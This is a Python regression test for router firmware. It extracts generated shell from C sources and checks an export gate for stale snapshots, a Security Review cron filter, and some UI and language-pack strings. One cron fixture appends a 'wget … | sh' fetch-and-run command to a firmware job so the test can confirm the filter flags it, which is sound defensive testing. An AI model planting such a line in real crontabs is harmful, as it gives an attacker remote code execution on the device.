#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Review 2026-11-23 (one pass over the uncommitted v3.8.4 delta plus tree-wide checks): the fixes that the per-feature
suites do not already cover.

WHY THIS EXISTS.
  1. rexport (Splunk / Datadog push): the "collector down" gate used `find "$H" -mmin +3`, and the router's busybox
     find has no -mmin (CONFIG_FEATURE_FIND_MMIN off), so the gate never closed and a crashed rtrafd's last snapshot
     was pushed every run as if it were live. It now reads the age with `date -r` (REAPER-REXPORT-STALE).
  2. Security Review: two cron lines the firmware installs were reported as unreviewed items - rwarden_ck in its
     Dreadwatch-only form (`sh /tmp/rwarden/dns.sh fold`) and reaper_ledns (Let's Encrypt by DNS). An id may now name
     several commands and a line passes only when it equals one of them exactly (REAPER-REVIEW-CRONFORMS).
  3. Policy Routing lists: a reply that covers more than half the Internet is not used, and the page names that
     reason (RVR_114, every language pack). The list script itself is run by test_fw_fetched_lists.py.
  4. httpd/web.c: the REAPER-REVIEW-OFF comment no longer says the Firewall switch asks for the admin password.

WHAT IT DOES. Extracts the generated shell from rc/rexport.c and rc/rwatch.c (the C string literals, decoded) and RUNS
it under sh: the rexport gate against a fresh, an old and a missing snapshot, and with `test`; the review's cron
filter against a crontab with every Reaper form and with look-alikes (a foreign command under a Reaper id, a Reaper
command with something appended, a Reaper command under another id). Then static pins.
Exit 0 pass, 1 fail, 77 skipped (no router source tree, or no sh).
"""
import os, re, shutil, subprocess, sys, tempfile, time

SRC = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("REAPER_ROUTER_SRC", "")
if not SRC or not os.path.isfile(os.path.join(SRC, "rc", "rexport.c")):
    print("SKIP: no router source tree (argv[1] or REAPER_ROUTER_SRC = .../release/src/router)"); sys.exit(77)
SH = shutil.which("sh")
if not SH or not sys.platform.startswith("linux"):
    print("SKIP: no sh / not Linux"); sys.exit(77)

fails = []
def check(name, cond, detail=""):
    print(("ok   " if cond else "FAIL ") + name)
    if not cond:
        fails.append(name + (" - " + str(detail)[:800] if detail else ""))

def read(rel):
    with open(os.path.join(SRC, rel), encoding="utf-8", errors="surrogateescape") as f:
        return f.read()

ESC = {"n": "\n", "t": "\t", "\\": "\\", '"': '"', "'": "'"}
def literals(c_text):
    """the C string literals of a slice of source, comments dropped, decoded and joined"""
    c_text = re.sub(r"/\*.*?\*/", "", c_text, flags=re.S)
    out = []
    for m in re.finditer(r'"((?:[^"\\\n]|\\.)*)"', c_text):
        out.append(re.sub(r"\\(.)", lambda e: ESC.get(e.group(1), "\\" + e.group(1)), m.group(1)))
    return "".join(out)

td = tempfile.mkdtemp(prefix="rv1123-")
try:
    b = os.path.join(td, "bin"); os.mkdir(b)
    with open(os.path.join(b, "logger"), "w", newline="\n") as fh:
        fh.write('#!/bin/sh\necho "LOGGER $*"\n')
    os.chmod(os.path.join(b, "logger"), 0o755)
    env = dict(os.environ, PATH=b + os.pathsep + os.environ.get("PATH", ""))

    # ---------------- 1. rexport: the stale-snapshot gate ----------------
    rx = read("rc/rexport.c")
    i = rx.find('"H=/tmp/rtraf/health.json\\n"'); j = rx.find('"  case \\"$(_nv reaper_export_mode)')
    gate = literals(rx[i:j]) if 0 <= i < j else ""
    tail = 'if [ "$1" != test ]; then\n'
    check("rexport: the gate is found ahead of the mode gate", gate.startswith("H=/tmp/rtraf/health.json\n") and gate.endswith(tail), gate)
    check("rexport: the age comes from date -r, not find -mmin (busybox find has no -mmin)",
          "REAPER-REXPORT-STALE" in rx and "-mmin" not in gate and 'date -r "$H" +%s' in gate and "-gt 180" in gate, gate)
    snap = os.path.join(td, "health.json")
    scr = os.path.join(td, "gate.sh")
    with open(scr, "w", newline="\n") as fh:
        fh.write(gate[:-len(tail)].replace("H=/tmp/rtraf/health.json", "H=" + snap) + "echo PUSH\n")
    def gate_run(*args):
        p = subprocess.run([SH, scr] + list(args), capture_output=True, text=True, env=env, timeout=30)
        return p.stdout
    with open(snap, "w") as fh: fh.write('{"ok":1}\n')
    out = gate_run()
    check("rexport: a snapshot written just now is pushed", "PUSH" in out and "stale" not in out, out)
    old = time.time() - 600; os.utime(snap, (old, old))
    out = gate_run()
    check("rexport: a snapshot 10 minutes old (rtrafd gone) is NOT pushed, and the log says why",
          "PUSH" not in out and "LOGGER -t rexport health.json stale (>3m) - collector down, not pushing" in out, out)
    out = gate_run("test")
    check("rexport: Test Connection still pushes an old snapshot (an endpoint can be checked)", "PUSH" in out, out)
    os.unlink(snap)
    out = gate_run()
    check("rexport: no snapshot at all - nothing pushed, nothing logged", out.strip() == "", out)
    mut = os.path.join(td, "mut.sh")
    with open(mut, "w", newline="\n") as fh:
        fh.write(gate[:-len(tail)].replace("H=/tmp/rtraf/health.json", "H=" + snap).replace("-gt 180", "-gt 999999") + "echo PUSH\n")
    with open(snap, "w") as fh: fh.write("{}\n")
    os.utime(snap, (old, old))
    p = subprocess.run([SH, mut], capture_output=True, text=True, env=env, timeout=30)
    check("MUTATION: with the age limit pushed out the old snapshot goes out (so the check above is real)", "PUSH" in p.stdout, p.stdout)

    # ---------------- 2. the Security Review's cron filter ----------------
    rw = read("rc/rwatch.c")
    i = rw.find('"_rv_cron_cmd() { case'); j = rw.find('esac; }\\n"', i)
    fn = literals(rw[i:j + len('esac; }\\n"')]) if 0 <= i < j else ""
    k = rw.find('"  cru l 2>/dev/null'); e = rw.find('"  done\\n"', k)
    loop = literals(rw[k:e + len('"  done\\n"')]) if 0 <= k < e else ""
    check("review: the command table and the cron walk are found", fn.startswith("_rv_cron_cmd()") and "while IFS= read -r l; do" in loop, fn + loop)
    tab = os.path.join(td, "crontab")
    LINES = {
        "*/15 * * * * sh /tmp/rwarden/fold.sh #rwarden_ck#": False,                   # Warden on
        "*/15 * * * * sh /tmp/rwarden/dns.sh fold #rwarden_ck#": False,               # Dreadwatch alone
        "37 3 * * * /sbin/reaper_ledns run #reaper_ledns#": False,                    # Let's Encrypt by DNS
        "*/15 * * * * sh /tmp/reaper_fw/lists.sh missing #reaper_fw_lists_retry#": False,
        "17 5 * * * sh /tmp/reaper_fw/lists.sh update #reaper_fw_lists#": False,
        "*/15 * * * * sh /tmp/x.sh #rwarden_ck#": True,                               # a foreign command under a Reaper id
        "*/15 * * * * sh /tmp/rwarden/fold.sh; wget -qO- http://h/x | sh #rwarden_ck#": True,
        "*/15 * * * * sh /tmp/rwarden/dns.sh fold extra #rwarden_ck#": True,          # exact line only
        "37 3 * * * /sbin/reaper_ledns run #rwatch#": True,                           # a Reaper command under another id
        "0 1 * * * sh /jffs/scripts/mine.sh #mine#": True,                            # the operator's own job
    }
    with open(tab, "w") as fh: fh.write("".join(l + "\n" for l in LINES))
    scr = os.path.join(td, "cron.sh")
    with open(scr, "w", newline="\n") as fh:
        fh.write(fn + 'cru() { cat "%s"; }\n' % tab + loop)
    p = subprocess.run([SH, scr], capture_output=True, text=True, env=env, timeout=30)
    got = [l.split("\t")[1] for l in p.stdout.splitlines() if l.startswith("C\t")]
    want = [l for l, rep in LINES.items() if rep]
    check("review: every cron line the firmware installs passes, in each of its forms", not [l for l in got if not LINES.get(l, True)], got)
    check("review: a foreign command under a Reaper id, an appended command, a Reaper command under another id and the "
          "operator's own job are all reported", got == want, (got, p.stderr))
    if shutil.which("busybox"):
        p2 = subprocess.run(["busybox", "ash", scr], capture_output=True, text=True, env=env, timeout=30)
        check("review: the same under busybox ash", [l.split("\t")[1] for l in p2.stdout.splitlines() if l.startswith("C\t")] == want, p2.stdout + p2.stderr)

    # ---------------- 3. Policy Routing: the "too wide" reason on the page ----------------
    pg = read("www/Reaper_VPNRouting.asp")
    check("page: the reason table names wide (RVR_114) after big", "big:`<#RVR_112#>`,wide:`<#RVR_114#>`};" in pg)
    fw = read("rc/reaper_fw.c")
    check("list script: wide() and the overlap filter are in the source", "REAPER-FW-LISTS-WIDE" in fw and "REAPER-FW-LISTS-OVERLAP" in fw
          and "why() { [ -n \\\"$WIDE\\\" ] && { echo wide; return; };" in fw)
    www = os.path.join(SRC, "www")
    miss = []
    for f in sorted(x for x in os.listdir(www) if re.match(r"^[A-Z]{2}\.dict$", x)):
        mm = re.search(r"^RVR_114=(.+)$", open(os.path.join(www, f), encoding="utf-8").read(), re.M)
        if not mm or any(x in mm.group(1) for x in ('"', "`", "\\", "${", "</")):
            miss.append(f)
    if os.environ.get("REAPER_SKIP_DICT"):
        print("note: dict check skipped (REAPER_SKIP_DICT)")
    else:
        check("RVR_114 in every language pack, quote-safe", not miss, miss)

    # ---------------- 4. web.c comment ----------------
    web = read("httpd/web.c")
    c = web[web.find("REAPER-REVIEW-OFF:"):web.find("static int reaper_review_off_refused(")]
    check("web.c: the REAPER-REVIEW-OFF comment no longer says the switch asks for the admin password",
          c and "asks for the admin password" not in c and "no password\n * prompt since 2026-11-23, REAPER-REVIEW-NOPW" in c, c[:400])
    check("rc/rexport.c, rc/rwatch.c: ASCII only", not re.search(r"[^\x00-\x7f]", rx + rw))
finally:
    shutil.rmtree(td, ignore_errors=True)

print("\n%d check(s) failed" % len(fails) if fails else "\nall checks passed")
for f in fails: print("  - " + f)
sys.exit(1 if fails else 0)
